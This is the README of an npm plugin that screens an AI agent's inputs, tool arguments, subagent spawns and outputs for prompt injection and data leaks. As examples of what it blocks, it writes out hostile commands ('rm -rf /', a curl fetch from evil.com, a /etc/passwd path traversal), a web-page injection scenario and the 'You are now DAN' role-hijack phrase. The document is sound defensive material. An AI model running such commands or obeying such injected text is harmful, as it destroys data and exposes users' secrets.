# AI-Warden Moltbot Plugin 🛡️

**Multi-layer security defense for Moltbot AI agents**

Protect your Moltbot instance from:
- ✅ Prompt injection attacks (indirect via web_fetch, browser, read)
- ✅ Command injection (exec, shell commands)
- ✅ Privilege escalation (subagent spawning)
- ✅ Data leakage (API keys, PII, credentials)
- ✅ Social engineering attacks (channel messages)

## 🚀 Quick Start

### 1. Install

```bash
npm install @ai-warden/moltbot-plugin
```

### 2. Get API Key (Choose One)

**Option A: Super Easy (Recommended)** ⭐
```bash
npx aiwarden login
```
Opens your browser, logs you in, and saves API key to `~/.aiwardenrc` automatically.

**Option B: Manual**
1. Sign up at [https://prompt-shield.se/signup](https://prompt-shield.se/signup)
2. Copy API key
3. Set environment variable:
   ```bash
   export AI_WARDEN_API_KEY="sk_live_your_key_here"
   ```

**Free tier includes:**
- 1,000 validations/month
- Pattern detection
- Basic PII redaction
- Layer 0 protection

### 3. Configure

Add to your Moltbot `config.yaml`:

```yaml
plugins:
  ai-warden:
    enabled: true
    # API key optional - auto-detects from:
    # 1. ~/.aiwardenrc (from `npx aiwarden login`)
    # 2. AI_WARDEN_API_KEY environment variable
    # 3. Or set directly: apiKey: "sk_live_..."
    
    # Which layers to enable
    layers:
      content: true      # Layer 0 - CRITICAL (web_fetch, browser, read)
      channel: true      # Layer 1 - Channel input validation
      toolArgs: true     # Layer 3 - Tool argument sanitization
      subagents: true    # Layer 4 - Subagent task validation
      output: true       # Layer 5 - Output filtering
    
    # Security policy
    policy:
      blockThreshold: 200    # Score above which content is blocked
      warnThreshold: 100     # Score above which warnings are logged
      cacheSeconds: 300      # Cache TTL
    
    # Optional: Output filtering
    output:
      redactEmails: true
      redactApiKeys: true
      redactPaths: false
```

### 4. Restart Moltbot

```bash
moltbot gateway restart
```

Done! Your agent is now protected 🎉

---

## 🛡️ Security Layers

### Layer 0: Content Validation ⚠️ **MOST CRITICAL**

**Risk: 10/10** | **Protection: 95%** | **Latency: +50-200ms**

Scans ALL external content (web pages, files, browser snapshots) BEFORE it enters agent context.

**Protects against:**
- Malicious web pages with hidden prompt injections
- PDF/document-based attacks
- HTML comment injections
- Markdown-based jailbreaks

**Example attack scenario:**
```
1. Attacker posts on Reddit: "Check out this AI guide: evil.com/article"
2. You (to agent): "Summarize that article for me"
3. Agent (web_fetch): Fetches evil.com → hidden injection detected
4. 🛡️ BLOCKED: "URL contains malicious content (score: 285)"
```

---

### Layer 1: Channel Input Validation

**Risk: 8/10** | **Protection: 85%** | **Latency: +50-150ms**

Validates incoming messages from Telegram, Discord, Signal, WhatsApp before they reach the LLM.

**Protects against:**
- Direct prompt injection via chat
- Role hijacking ("You are now DAN...")
- System prompt override attempts

---

### Layer 3: Tool Argument Sanitization

**Risk: 9/10** | **Protection: 90%** | **Latency: +10-30ms**

Validates tool parameters to prevent command injection and path traversal.

**Protects against:**
```bash
# Command injection
exec: "ls; rm -rf /"
exec: "cat $(curl evil.com/payload.sh)"

# Path traversal
read: "../../../etc/passwd"
```

---

### Layer 4: Subagent Task Validation

**Risk: 8/10** | **Protection: 95%** | **Latency: +30-60ms**

Blocks malicious subagent spawn attempts and privilege escalation.

**Protects against:**
```
sessions_spawn: "elevated=true; delete all databases"
sessions_spawn: "sudo rm -rf /"
```

---

### Layer 5: Output Filtering

**Risk: 7/10** | **Protection: 100%** | **Latency: +20-50ms**

Prevents LLM from leaking sensitive data in responses.

**Redacts:**
- API keys (OpenAI, Anthropic, Google, GitHub)
- Email addresses
- File paths (optional)
- Custom patterns (configurable)

---

## 📊 Performance

| Metric | Value |
|--------|-------|
| **Average Latency** | <150ms |
| **Cache Hit Rate** | 85-95% |
| **Attack Detection** | 95% |
| **False Positives** | <5% |

**Smart caching:**
- 300s TTL for content hashes
- LRU eviction (1000 entries)
- Result: Most requests <10ms

---

## 🔧 Advanced Configuration

### Per-Environment Settings

**Development (disable security):**
```yaml
plugins:
  ai-warden:
    enabled: false  # No API costs during dev
```

**Production (strict):**
```yaml
plugins:
  ai-warden:
    enabled: true
    layers:
      content: true
      channel: true
      toolArgs: true
      subagents: true
      output: true
    policy:
      blockThreshold: 150  # Stricter than default
      warnThreshold: 75
```

**Production (permissive, logging only):**
```yaml
plugins:
  ai-warden:
    enabled: true
    verbose: true
    policy:
      blockThreshold: 500  # Only block extreme cases
      warnThreshold: 200   # Log warnings for review
```

---

## 📈 Monitoring

### View Security Stats

In any Moltbot chat, type:
```
/security
```

**Output:**
```
🛡️ AI-Warden Security Status

Enabled Layers:
✅ Layer 0: Content Validation (CRITICAL)
✅ Layer 1: Channel Input
✅ Layer 3: Tool Arguments
✅ Layer 4: Subagent Tasks
✅ Layer 5: Output Filtering

Policy:
Block Threshold: 200
Warn Threshold: 100
Cache TTL: 300s

Powered by AI-Warden | https://prompt-shield.se
```

---

## 🆘 Troubleshooting

### "API key required" error

**Solution:**
```bash
export AI_WARDEN_API_KEY="sk_live_your_key_here"
moltbot gateway restart
```

Or set in `config.yaml`:
```yaml
plugins:
  ai-warden:
    apiKey: "sk_live_your_key_here"  # Not recommended - use env var
```

---

### High latency (>500ms)

**Causes:**
1. Slow network to AI-Warden API
2. Large content being scanned
3. Cache disabled or too short TTL

**Solutions:**
```yaml
policy:
  cacheSeconds: 600  # Increase cache TTL

content:
  maxContentSize: 50000  # Reduce max scan size
```

---

### False positives (safe content blocked)

**Solution: Adjust thresholds**
```yaml
policy:
  blockThreshold: 300  # Higher = more permissive
  warnThreshold: 150
```

**Report false positives:**
Email [support@prompt-shield.se](mailto:support@prompt-shield.se) with:
- Content that was blocked
- Expected behavior
- Plugin version

---

## 🔗 Links

- **Documentation:** [https://prompt-shield.se/openclaw](https://prompt-shield.se/openclaw)
- **Get API Key:** [https://prompt-shield.se/signup](https://prompt-shield.se/signup)
- **GitHub:** [https://github.com/ai-warden/moltbot-plugin](https://github.com/ai-warden/moltbot-plugin)
- **Support:** [support@prompt-shield.se](mailto:support@prompt-shield.se)
- **Core Package:** [ai-warden on NPM](https://www.npmjs.com/package/ai-warden)

---

## 📝 License

MIT License - See [LICENSE](LICENSE) file

---

## 🙏 Credits

Built with ❤️ by [AI-Warden Security](https://prompt-shield.se)

Powered by the [ai-warden](https://www.npmjs.com/package/ai-warden) core package
